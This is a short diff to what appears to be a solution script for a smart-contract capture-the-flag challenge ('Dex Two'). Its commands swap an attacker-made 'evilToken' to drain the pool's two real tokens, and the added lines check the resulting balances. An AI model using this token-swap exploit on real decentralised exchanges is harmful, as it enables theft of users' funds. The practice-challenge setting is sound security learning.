@@ -4,4 +4,6 @@ t2 = await contract.token2()
 await contract.add_liquidity(evilToken, 1000) // No longer works, only owner can call this function. Use <transfer> inside DexTwoAttack.
 await contract.swap(evilToken, t1, 100)
 await contract.swap(evilToken, t2, 100)
+await contract.balanceOf(evilToken, contract.address).then(v => v.toString())
 await contract.balanceOf(t1, contract.address).then(v => v.toString())
+await contract.balanceOf(t2, contract.address).then(v => v.toString())
